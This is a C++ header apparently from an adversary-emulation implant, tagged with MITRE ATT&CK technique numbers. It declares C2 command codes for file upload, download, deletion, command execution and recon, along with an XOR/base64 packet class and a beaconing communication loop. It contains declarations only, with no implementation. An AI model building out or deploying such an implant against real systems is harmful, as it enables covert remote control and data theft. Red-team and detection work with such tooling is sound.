#pragma once
#ifndef __COMMS_H__
#define __COMMS_H__

#include <iostream>
#include <string>
#include <vector>
#include <chrono>
#include <thread>
#include <filesystem>
#include "json.hpp"
#include "core.hpp"
#include "xor_logger.hpp"
#include "utilities.hpp"
#include "settings.hpp"

#define DEFAULT_BUFLEN 1024

#define COMMAND_READ 24         // upload to c2
#define COMMAND_WRITE 15        // download from c2
#define COMMAND_DELETE 26       // delete on disk
#define COMMAND_EXECUTE 2       // exec cmd
#define COMMAND_GTEST 52        // for gtest
#define INIT_RECON 42           // recon packet

// namespace for all communicaiton related classes, methods, etc.
namespace Communication {

    // namesocace for TCP related communcication
    namespace TCP {

        // Beacon sleep timer
        extern int beaconSleepTime;


        // Packet class; used to create packets that are sent to the C2 server
        class Packet {
        public:

            std::vector<char> packetData;
            bool packetEncrypted = false;

            //    Packet::SetPacketData()
            //      About:
            //         Packet Class: Takes a string, converts to a vector char and stores in packetData
            //      Result:
            //         converts the string to vector char and stores it in packetData
            //      Returns:
            //         [NULL]
            //      MITRE ATT&CK Techniques:
            //         n/a
            void SetPacketData(std::string data);

            //   Packet::GetPacketString()
            //      About:
            //         Packet Class: Gets data in the packetData variable
            //      Result:
            //         converts the vector char packetData to string and returns it
            //      Returns:
            //         [std::string] packetData
            //      MITRE ATT&CK Techniques:
            //         n/a
            std::string GetPacketString();

            //   Packet::GetPacketData()
            //      About:
            //         Packet Class: Gets data in the packetData variable
            //      Result:
            //         converts the vector char packetData to string and returns it
            //      Returns:
            //         [std::string] packetData
            //      MITRE ATT&CK Techniques:
            //         n/a
            nlohmann::json GetPacketData();

            //    Packet::AddPacketField(std::string field, std::string value)
            //      About:
            //         Packet Class: Takes 2 strings, and adds the data to he existing packet data
            //      Result:
            //         Adds a value to the packetData
            //      Returns:
            //         [NULL]
            //      MITRE ATT&CK Techniques:
            //         n/a
            void AddPacketField(std::string field, std::string value);

            //   Packet::SendPacket()
            //      About:
            //         Packet Class: Sends a packet and retireves a response
            //      Result:
            //         Sends a packet to the C2 and passes the result to the C2  handling funcions
            //      Returns:
            //         [int] Success/failure
            //      MITRE ATT&CK Techniques:
            //         T1095 Non-Application Layer Protocol
            int SendPacket();

            //   Packet::EncryptPacketData()
            //      About:
            //          Packet Class: Encrypts data in packetData
            //      Result:
            //          xor/b64's data in packetData
            //      Returns:
            //          [void]
            void EncryptPacketData();

            //   Packet::DecryptPacketData()
            //      About:
            //          Packet Class: Decrypts data in packetData
            //      Result:
            //          removes b64 and xor's the data in packetData
            //      Returns:
            //          [void]
            void DecryptPacketData();
        };
    }

    //  HandleC2Response(Communication::TCP::Packet Packet)
    //      About:
    //         Takes 1 argument (packetData) and determines action to take based on the date inside the packet
    //      Result:
    //         Performs a requested action
    //      Returns:
    //         [int] The result of the TCP send data (error/success code)
    //      MITRE ATT&CK Techniques:
    //         T1095 Non-Application Layer Protocol

    int HandleC2Response(Communication::TCP::Packet Packet);

    //  InitCommunicationLoop()
    //      About:
    //         Starts the C2 communication
    //      Result:
    //         Continueous loop for C2 communication
    //      Returns:
    //         [NULL]
    //      MITRE ATT&CK Techniques:
    //         T1095 Non-Application Layer Protocol
    void InitCommunicationLoop();

}

#endif